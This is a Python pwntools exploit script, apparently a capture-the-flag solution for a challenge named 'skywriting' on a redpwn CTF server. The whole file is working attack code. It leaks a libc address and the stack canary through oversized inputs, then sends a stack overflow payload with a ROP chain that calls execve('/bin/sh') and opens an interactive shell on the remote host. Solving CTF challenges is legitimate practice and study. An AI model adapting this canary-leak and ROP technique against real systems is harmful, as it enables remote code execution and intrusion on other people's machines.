from pwn import *

context.update(log_level='debug')

#p = process('bin/skywriting')
p = remote('2020.redpwnc.tf', 31034)

p.recvrepeat(1)

p.sendline('1')


#raw_input('debug: ' + str(p.pid))
p.recvrepeat(1)


#leak libc
p.sendline('a'*0x37)
addr_libc = u64(p.recvuntil('??')[-8:-2].ljust(8, '\x00'))
addr_libc_base = addr_libc - 0x3f3660

log.info('libc: ' + hex(addr_libc))
log.info('libc base: ' + hex(addr_libc_base))

p.recvrepeat(1)


libc = ELF('libc-2.27.so')
offset_execve = libc.symbols['execve']
addr_libc_execve = addr_libc_base + offset_execve
log.info('libc_execve: ' + hex(addr_libc_execve))

addr_popRDI = 0x000000000002155f + addr_libc_base
addr_popRSI = 0x0000000000023e6a + addr_libc_base
addr_popRDX = 0x0000000000001b96 + addr_libc_base

addr_libc_binsh = addr_libc_base + list(libc.search('/bin/sh'))[0]


#leak canary
p.send('a'*0x89)
#p.sendlineafter(':', 'a'*0x88)
serial = 'notflag{a_cloud_is_just_someone_elses_computer}\n\x00'
canary = u64(p.recv(0x90)[-7:].rjust(8, '\x00'))
log.info('canary: ' + hex(canary))

#break loop after recover canary
p.recvrepeat(1)
payload = serial + '\x00'*(0x88-len(serial)) + p64(canary) + p64(0xdeadbeefdeadbeef)
payload += p64(addr_popRDI) + p64(addr_libc_binsh)
payload += p64(addr_popRSI) + p64(0)
payload += p64(addr_popRDX) + p64(0)
payload += p64(addr_libc_execve)
p.send(payload)

p.interactive()
